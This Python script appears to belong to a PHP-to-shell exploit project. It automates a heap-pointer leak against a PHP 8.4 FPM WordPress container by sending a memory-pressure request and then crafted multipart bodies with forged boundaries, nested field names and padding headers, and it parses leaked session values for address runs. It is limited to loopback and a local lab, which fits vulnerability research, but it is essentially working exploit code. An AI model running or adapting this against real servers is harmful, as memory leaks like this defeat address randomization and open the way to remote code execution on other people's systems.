#!/usr/bin/env python3
"""Bounded loopback scanner for the pinned PHP 8.4 FPM leak geometry."""

from __future__ import annotations

import argparse
import http.client
import json
import re
import secrets
import shlex
import string
import struct
import subprocess
import time
from pathlib import Path
from urllib.parse import unquote_to_bytes

ROOT = Path(__file__).resolve().parents[2]

from payloads import (
    FORGED_BOUNDARY,
    build_xpad_depth60,
    make_pressure_body,
    sha256,
)


def fresh_sid(length: int = 13) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def candidate(depth: int, xpad_len: int) -> bytes:
    body = build_xpad_depth60()
    original_pad = b"X-Pad: " + b"P" * 75_000
    replacement_pad = b"X-Pad: " + b"P" * xpad_len
    if body.count(original_pad) != 1:
        raise RuntimeError("X-Pad marker changed")
    body = body.replace(original_pad, replacement_pad, 1)

    old = b'name="x461' + b"[a]" * 60 + b'"; filename=""'
    new = b'name="x461' + b"[a]" * depth + b'"; filename=""'
    if body.count(old) != 1:
        raise RuntimeError("x461 marker changed")
    body = body.replace(old, new, 1)
    if len(body) > 1_048_576:
        raise RuntimeError("candidate exceeds the local body limit")
    return body


def pointer_windows(response: bytes) -> list[dict[str, object]]:
    values = [
        unquote_to_bytes(match.group(1).replace(b"+", b" "))
        for match in re.finditer(rb'\?s=([^"\'&<> ]+)', response)
    ]
    findings: list[dict[str, object]] = []
    for value_index, value in enumerate(values):
        if len(value) != 291:
            continue
        words = [struct.unpack_from("<Q", value, offset)[0] for offset in range(0, 284, 8)]
        run_start = 0
        while run_start < len(words):
            word = words[run_start]
            base = word & ~0x1FFFFF
            if not (word % 16 == 0 and 0 < word < 1 << 47):
                run_start += 1
                continue
            run_end = run_start + 1
            while run_end < len(words):
                next_word = words[run_end]
                if next_word % 16 or not 0 < next_word < 1 << 47 or next_word & ~0x1FFFFF != base:
                    break
                run_end += 1
            if run_end - run_start >= 4:
                findings.append(
                    {
                        "value_index": value_index,
                        "value_bytes": len(value),
                        "offset": run_start * 8,
                        "word_count": run_end - run_start,
                        "base": hex(base),
                        "words": [hex(item) for item in words[run_start:run_end]],
                        "prefix_z": len(value) - len(value.lstrip(b"Z")),
                        "sha256": sha256(value),
                    }
                )
            run_start = max(run_end, run_start + 1)
    return findings


class Lab:
    def __init__(self, host: str, port: int, container: str, docker: list[str]):
        self.host = host
        self.port = port
        self.container = container
        self.docker = docker

    def command(self, *args: str, timeout: int = 120) -> subprocess.CompletedProcess[bytes]:
        return subprocess.run(
            [*self.docker, *args],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False,
        )

    def worker(self) -> int:
        result = self.command("top", self.container, "-eo", "pid,ppid,user,cmd")
        if result.returncode:
            raise RuntimeError(result.stderr.decode("utf-8", "replace")[:300])
        pids = [
            int(line.split()[0])
            for line in result.stdout.decode("utf-8", "replace").splitlines()
            if "php-fpm: pool www" in line
        ]
        if len(pids) != 1:
            raise RuntimeError(f"expected one FPM worker, found {pids}")
        return pids[0]

    def restart(self) -> int:
        result = self.command("restart", self.container)
        if result.returncode:
            raise RuntimeError(result.stderr.decode("utf-8", "replace")[:300])
        for _ in range(40):
            try:
                pid = self.worker()
                status, body = self.request("GET", "/")
                if status == 200 and b"wp-content" in body:
                    return pid
            except (OSError, RuntimeError):
                pass
            time.sleep(0.25)
        raise RuntimeError("FPM84 worker did not become ready")

    def request(
        self,
        method: str,
        path: str,
        body: bytes | None = None,
        boundary: str | None = None,
        sid: str | None = None,
    ) -> tuple[int, bytes]:
        headers = {"Host": f"{self.host}:{self.port}"}
        if body is not None:
            if boundary is None:
                raise ValueError("multipart boundary required")
            headers["Content-Type"] = "multipart/form-data; boundary=" + boundary
            headers["Content-Length"] = str(len(body))
        if sid is not None:
            headers["Cookie"] = "PHPSESSID=" + sid
        connection = http.client.HTTPConnection(self.host, self.port, timeout=90)
        try:
            connection.request(method, path, body=body, headers=headers)
            response = connection.getresponse()
            return response.status, response.read()
        finally:
            connection.close()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18235)
    parser.add_argument("--container", default="php2shell-fpm84")
    parser.add_argument("--docker-command", default="docker")
    parser.add_argument("--xpad", type=int, default=75_000)
    parser.add_argument("--producer-fields", type=int, default=80)
    parser.add_argument("--depth-min", type=int, default=0)
    parser.add_argument("--depth-max", type=int, default=64)
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    if args.host not in {"127.0.0.1", "localhost", "::1"}:
        parser.error("loopback only")
    if not 0 <= args.depth_min <= args.depth_max <= 64:
        parser.error("depth range must be inside 0..64")
    if not 0 <= args.xpad <= 200_000:
        parser.error("X-Pad outside bounded local range")
    docker = shlex.split(args.docker_command)
    if not docker:
        parser.error("empty Docker command")

    depths = sorted(
        range(args.depth_min, args.depth_max + 1),
        key=lambda depth: (abs(depth - 57), depth),
    )
    plan = {
        "mode": "fpm84_local_leak_scan",
        "xpad": args.xpad,
        "producer_fields": args.producer_fields,
        "depths": depths,
        "requests_per_depth": 2,
        "loopback_only": True,
    }
    if not args.execute:
        print(json.dumps(plan, indent=2))
        return

    output = (args.output_dir or ROOT / "runs" / "fpm84-calibration").resolve()
    output.mkdir(parents=True, exist_ok=False)
    journal = {**plan, "attempts": []}
    (output / "journal.json").write_text(json.dumps(journal, indent=2) + "\n")

    lab = Lab(args.host, args.port, args.container, docker)
    producer, producer_boundary = make_pressure_body(
        884,
        60,
        args.producer_fields,
        256,
        progress=False,
        session_id="",
    )
    for attempt, depth in enumerate(depths, 1):
        pid = lab.restart()
        producer_status, producer_response = lab.request(
            "POST", "/", producer, producer_boundary
        )
        if (
            producer_status != 200
            or b"Allowed memory size" not in producer_response
            or lab.worker() != pid
        ):
            raise RuntimeError(f"producer failed at depth {depth}")

        body = candidate(depth, args.xpad)
        sid = fresh_sid()
        status, response = lab.request(
            "POST", "/index.php", body, FORGED_BOUNDARY.decode(), sid
        )
        findings = pointer_windows(response)
        current = lab.worker()
        row = {
            "attempt": attempt,
            "depth": depth,
            "xpad": args.xpad,
            "pid_before": pid,
            "pid_after": current,
            "status": status,
            "request_bytes": len(body),
            "request_sha256": sha256(body),
            "response_bytes": len(response),
            "response_sha256": sha256(response),
            "findings": findings,
        }
        journal["attempts"].append(row)
        (output / "journal.json").write_text(json.dumps(journal, indent=2) + "\n")
        print(json.dumps(row), flush=True)
        if findings:
            (output / "hit.request.bin").write_bytes(body)
            (output / "hit.response.bin").write_bytes(response)
            journal["success"] = True
            journal["hit"] = row
            (output / "result.json").write_text(json.dumps(journal, indent=2) + "\n")
            return

    journal["success"] = False
    (output / "result.json").write_text(json.dumps(journal, indent=2) + "\n")
    raise RuntimeError("no pointer window found in the bounded depth scan")


if __name__ == "__main__":
    main()
